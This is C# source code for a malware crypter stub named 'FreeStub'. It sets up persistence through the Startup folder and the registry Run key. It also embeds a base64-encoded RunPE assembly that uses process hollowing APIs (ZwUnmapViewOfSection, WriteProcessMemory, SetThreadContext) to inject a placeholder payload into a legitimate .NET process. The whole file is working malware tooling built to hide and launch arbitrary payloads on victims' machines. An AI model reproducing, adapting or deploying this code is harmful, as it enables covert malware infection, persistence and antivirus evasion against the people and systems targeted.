using System;
using System.Text;
using System.Reflection;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace FreeStub
{
    class Class1
    {
        private static string InjectionProcess = "%Process%";

        private static string DropToStartup = "%Startup%";
        private static string StartupFilename = "%Filename%";

        private static string RegistryStartup = "%Registry%";
        private static string RegistryName = "%RegName%";

        static void Main()
        {
            InstallPayload();
            Thread.Sleep(2000);
            byte[] Runpe = Convert.FromBase64String("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bnQzMgBUb0ludDMyAFJlc2VydmVkMgBUb0ludDE2ADxNb2R1bGU+AERlbGVnYXRlQ3JlYXRlUHJvY2Vzc0EATG9hZExpYnJhcnlBAG1zY29ybGliAE1pc2MAVGhyZWFkSWQAUHJvY2Vzc0lkAEdldFByb2Nlc3NCeUlkAGJ5dGVzUmVhZABEZWxlZ2F0ZVJlc3VtZVRocmVhZAB0aHJlYWQAcGF5bG9hZABtZXRob2QARW5kSW52b2tlAEJlZ2luSW52b2tlAFRocmVhZEhhbmRsZQBSdW50aW1lVHlwZUhhbmRsZQBHZXRUeXBlRnJvbUhhbmRsZQBQcm9jZXNzSGFuZGxlAGhhbmRsZQBUaXRsZQBhcHBsaWNhdGlvbk5hbWUAbmFtZQBjb21tYW5kTGluZQBOeWFuUnVucGUAVmFsdWVUeXBlAHR5cGUATXVsdGljYXN0RGVsZWdhdGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARXhlY3V0ZQBCeXRlAGdldF9TaXplAGJ1ZmZlclNpemUAU2l6ZU9mAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAU3RyaW5nAHBhdGgAbGVuZ3RoAExvYWRBcGkAQ3JlYXRlQXBpAEFzeW5jQ2FsbGJhY2sAY2FsbGJhY2sATWFyc2hhbABOeWFuUnVucGUuZGxsAEtpbGwAU3lzdGVtAGJ5dGVzV3JpdHRlbgBTdGFydHVwSW5mb3JtYXRpb24AUHJvY2Vzc0luZm9ybWF0aW9uAHByb2Nlc3NJbmZvcm1hdGlvbgBEZWxlZ2F0ZVp3VW5tYXBWaWV3T2ZTZWN0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAEV4Y2VwdGlvbgBzdGFydHVwSW5mbwBaZXJvAERlc2t0b3AAQnVmZmVyAGJ1ZmZlcgBHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcgBCaXRDb252ZXJ0ZXIAU3RkRXJyb3IALmN0b3IALmNjdG9yAEludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAaW5oZXJpdEhhbmRsZXMAdGhyZWFkQXR0cmlidXRlcwBwcm9jZXNzQXR0cmlidXRlcwBHZXRCeXRlcwBjcmVhdGlvbkZsYWdzAFdvcmtpbmdDbGFzcwBoUHJvY2VzcwBwcm9jZXNzAEdldFByb2NBZGRyZXNzAGJhc2VBZGRyZXNzAGFkZHJlc3MAT2JqZWN0AG9iamVjdABwcm90ZWN0AElBc3luY1Jlc3VsdAByZXN1bHQAZW52aXJvbm1lbnQAQ29udmVydABTdGRJbnB1dABTdGRPdXRwdXQARGVsZWdhdGVXb3c2NEdldFRocmVhZENvbnRleHQARGVsZWdhdGVHZXRUaHJlYWRDb250ZXh0AERlbGVnYXRlV293NjRTZXRUaHJlYWRDb250ZXh0AERlbGVnYXRlU2V0VGhyZWFkQ29udGV4dABjb250ZXh0AERlbGVnYXRlVmlydHVhbEFsbG9jRXgAQXJyYXkAQmxvY2tDb3B5AERlbGVnYXRlUmVhZFByb2Nlc3NNZW1vcnkARGVsZWdhdGVXcml0ZVByb2Nlc3NNZW1vcnkAY3VycmVudERpcmVjdG9yeQBFbXB0eQAAABFrAGUAcgBuAGUAbAAzADIAABlSAGUAcwB1AG0AZQBUAGgAcgBlAGEAZAAAK1cAbwB3ADYANABTAGUAdABUAGgAcgBlAGEAZABDAG8AbgB0AGUAeAB0AAAhUwBlAHQAVABoAHIAZQBhAGQAQwBvAG4AdABlAHgAdAAAK1cAbwB3ADYANABHAGUAdABUAGgA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");
            byte[] Payload = Convert.FromBase64String("%PayloadBase64%");
            Assembly RunpeLoader = Assembly.Load(Runpe);
            object[] Params = new object[] { Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), InjectionProcess), Payload };
            RunpeLoader.GetType("NyanRunpe.WorkingClass").GetMethod("Execute").Invoke(null, Params);
        }

        private static void InstallPayload()
        {
            if (DropToStartup == "True")
            {
                string DestinationPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + StartupFilename; 
                File.Copy(Application.ExecutablePath, DestinationPath, true);
            }

            if (RegistryStartup == "True")
            {
                RegistryKey RegKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                RegKey.SetValue(RegistryName, Application.ExecutablePath, RegistryValueKind.String);
            }
        }
    }
}